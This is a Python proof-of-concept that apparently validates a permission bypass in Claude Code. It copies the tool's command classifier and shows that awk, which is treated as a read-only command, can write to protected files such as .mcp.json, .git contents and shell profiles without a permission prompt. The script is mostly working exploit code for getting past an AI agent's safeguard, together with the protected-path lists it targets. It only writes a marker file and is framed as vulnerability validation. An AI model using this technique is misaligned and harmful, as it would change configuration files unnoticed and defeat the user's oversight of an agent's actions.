#!/usr/bin/env python3
"""
Claude Code awk permission-bypass validation PoC (passive method).

Passive method:
  Replicate Claude Code's command classifier (kCH -> a68 -> hP6) locally and
  run the awk command through subprocess. No live Claude Code session is
  contacted and no prompt injection is deployed. This shows the local mechanic
  and the classifier bypass only. Real confirmation requires running the command
  inside a Claude Code session and checking whether a permission prompt appears.

Usage:
  poc.py -x "awk 'BEGIN{print \"x\" > \".mcp.json\"}' ./README.md"
  poc.py -t /path/.mcp.json -m "Vuln Hit!"

Author: J4ck3LSyN
Original Researcher: Andrew C. Doorman  
Authority: BrokenSec
Repository: <null>
"""

import argparse, os, shlex, subprocess, sys, tempfile

FV4 = {
    ".bashrc", ".bash_profile", ".zshrc", ".zprofile", ".profile", ".zshenv",
    ".zlogin", ".zlogout", ".bash_login", ".bash_aliases", ".bash_logout",
    ".envrc", ".gitconfig", ".gitmodules", ".npmrc", ".yarnrc", ".yarnrc.yml",
    ".pnp.cjs", ".pnp.loader.mjs", ".pnpmfile.cjs", "bunfig.toml",
    ".bunfig.toml", ".bazelrc", ".bazelversion", ".bazeliskrc",
    ".pre-commit-config.yaml", "lefthook.yml", ".lefthook.yml", "lefthook.yaml",
    ".lefthook.yaml", ".mcp.json", ".claude.json", ".ripgreprc",
    ".devcontainer.json", "pyrightconfig.json", "gradle-wrapper.properties",
    "maven-wrapper.properties",
}

W1A = {".git", ".vscode", ".idea", ".claude", ".husky", ".cargo",
       ".devcontainer", ".yarn", ".mvn"}

KCH = {
    "awk": "read", "gawk": "read", "mawk": "read", "nawk": "read",
    "cat": "read", "head": "read", "tail": "read",
    "sed": "write", "rm": "write", "cp": "write", "mv": "write",
}


def a68_awk(args):
    q = {"-F", "--field-separator", "-v", "--assign", "-e", "--source"}
    K = {"-f", "--file", "-E", "--exec"}
    paths = []
    f = False
    dashdash = False
    i = 0
    while i < len(args):
        z = args[i]
        if z is None:
            i += 1
            continue
        if not dashdash and z == "--":
            dashdash = True
            i += 1
            continue
        if not dashdash and z.startswith("-"):
            y = z.find("=")
            o = z[:y] if y >= 0 else z
            if o in q:
                if o in ("-e", "--source"):
                    f = True
                i += (2 if y < 0 else 1)
                continue
            if o in K:
                f = True
                if y >= 0:
                    paths.append(z[y + 1:])
                elif i + 1 < len(args) and args[i + 1] is not None:
                    paths.append(args[i + 1])
                    i += 1
                i += 1
                continue
            i += 1
            continue
        if not f:
            f = True
            i += 1
            continue
        paths.append(z)
        i += 1
    return paths


def protected(name):
    base = os.path.basename(name)
    if base in FV4:
        return "FV4:" + base
    for part in name.replace("\\", "/").split("/"):
        if part in W1A:
            return "W1A:" + part
    return None


def simulate(command, write_target=None):
    try:
        argv = shlex.split(command)
    except ValueError as e:
        return {"decision": "error", "reason": "parse error: " + str(e)}
    if not argv:
        return {"decision": "error", "reason": "empty command"}
    binary = os.path.basename(argv[0])
    K = KCH.get(binary)
    if K is None:
        return {"decision": "ask", "K": None,
                "reason": "unknown binary -> prompt expected"}
    paths = a68_awk(argv[1:])
    if K == "read":
        decision = "ALLOW (no prompt)"
        skipped = True
    else:
        if any(protected(p) for p in paths):
            return {"decision": "BLOCK", "K": K, "paths": paths,
                    "reason": "GT8/k1A blocks protected path"}
        decision = "ALLOW (no prompt)"
        skipped = False
    bypass = False
    if write_target and protected(write_target):
        if not any(protected(p) and os.path.basename(p) ==
                   os.path.basename(write_target) for p in paths):
            bypass = True
    return {"decision": decision, "K": K, "paths": paths,
            "skipped": skipped, "bypass": bypass}


def run_command(cmd, timeout, env=None):
    try:
        proc = subprocess.run(cmd, shell=True, env=env, capture_output=True,
                              text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return False, "timeout"
    except Exception as e:
        return False, "exec error: " + str(e)
    if proc.returncode != 0:
        err = (proc.stderr or proc.stdout or "").strip()
        return False, "exit " + str(proc.returncode) + ": " + err
    return True, "exit 0"


def validate(target, expected):
    try:
        with open(target, "r") as fh:
            actual = fh.read()
    except Exception as e:
        return False, "cannot read " + str(target) + ": " + str(e)
    if actual == expected or actual.rstrip("\n") == expected:
        return True, "content verified: " + repr(actual)
    return False, "mismatch: expected " + repr(expected) + " got " + repr(actual)


def build_default_command():
    return "awk 'BEGIN { print ENVIRON[\"CC_PAYLOAD\"] > ENVIRON[\"CC_TARGET\"] }'"


def main():
    ap = argparse.ArgumentParser(
        description="Claude Code awk permission-bypass validation PoC (passive)")
    ap.add_argument("-x", "--command", default=None,
                    help="awk command to execute (command input). If omitted, "
                         "a default marker-write command is built from -t/-m.")
    ap.add_argument("-t", "--target", default=None,
                    help="locked/protected location for the marker write.")
    ap.add_argument("-m", "--marker", default="Vuln Hit!",
                    help="marker content written by the default command.")
    ap.add_argument("-v", "--validate", dest="validate", action="store_true",
                    default=True, help="validate the written marker (default on).")
    ap.add_argument("--no-validate", dest="validate", action="store_false",
                    help="disable validation of the written marker.")
    ap.add_argument("-n", "--no-sim", action="store_true",
                    help="skip the classifier simulation.")
    ap.add_argument("-q", "--quiet", action="store_true",
                    help="print only result lines.")
    ap.add_argument("--timeout", type=int, default=10,
                    help="subprocess timeout in seconds (default 10).")
    args = ap.parse_args()

    if args.target:
        target = os.path.abspath(args.target)
        sandbox = os.path.dirname(target)
        os.makedirs(sandbox, exist_ok=True)
    else:
        sandbox = tempfile.mkdtemp(prefix="awk_poc_")
        os.makedirs(os.path.join(sandbox, ".git"), exist_ok=True)
        target = os.path.join(sandbox, ".git", "VULNERABLE.txt")

    if args.command:
        command = args.command
        write_target = target if args.target else None
        env = None
        # If the explicit command uses the CC_PAYLOAD / CC_TARGET env hooks,
        # inject them so it writes the marker to the chosen target. Otherwise
        # run the command as-is (validation reads -t if provided).
        if "CC_TARGET" in command:
            env = dict(os.environ)
            env["CC_PAYLOAD"] = args.marker
            env["CC_TARGET"] = target
    else:
        command = build_default_command()
        write_target = target
        env = dict(os.environ)
        env["CC_PAYLOAD"] = args.marker
        env["CC_TARGET"] = target

    pinfo = protected(target)
    if not args.quiet:
        print("== Claude Code awk permission-bypass PoC (passive) ==")
        print("[*] target   : " + target)
        print("[*] protected : " + (pinfo if pinfo else "no (not FV4/W1A)"))
        print("[*] command  : " + command)
        print("[*] uid      : " + str(os.getuid()) +
              (" (root bypasses OS checks)" if os.getuid() == 0 else ""))

    sim = None
    if not args.no_sim:
        sim = simulate(command, write_target=write_target)
        if not args.quiet:
            print("-- classifier simulation (kCH -> a68 -> hP6) --")
            print("[*] K         : " + str(sim.get("K")))
            print("[*] a68 paths : " + str(sim.get("paths")))
            print("[*] decision  : " + str(sim.get("decision")))
            if sim.get("skipped"):
                print("[*] GT8/k1A + ZeH + DT skipped (gated on K != 'read')")
            if sim.get("bypass"):
                print("[*] BYPASS: protected write target not in a68 paths")

    print("[*] executing command (passive local run) ...")
    ok, detail = run_command(command, args.timeout, env=env)
    if not ok:
        print("[-] execution failed: " + detail)
        return 2

    print("[+] execution ok: " + detail)

    if args.validate:
        vok, vdetail = validate(target, args.marker)
        print(("[+] " if vok else "[-] ") + "validation: " + vdetail)
    else:
        vok = True
        vdetail = "skipped"

    print("== RESULT ==")
    if ok and (not args.validate or vok):
        print("[+] PASSIVE LOCAL WRITE CONFIRMED")
        if sim and sim.get("bypass"):
            print("[+] classifier sim shows AUTO-ALLOW for protected target")
        print("[*] NOTE: local success proves awk CAN write. The Claude Code")
        print("    bug is confirmed only if a live session auto-approves with")
        print("    no prompt. Root also bypasses OS checks.")
    else:
        print("[-] check failed")
    print("[*] artifact: " + target)
    print("[*] cleanup : " + ("rm -rf " + sandbox if not args.target
                               else "rm -f " + target))
    return 0


if __name__ == "__main__":
    sys.exit(main())
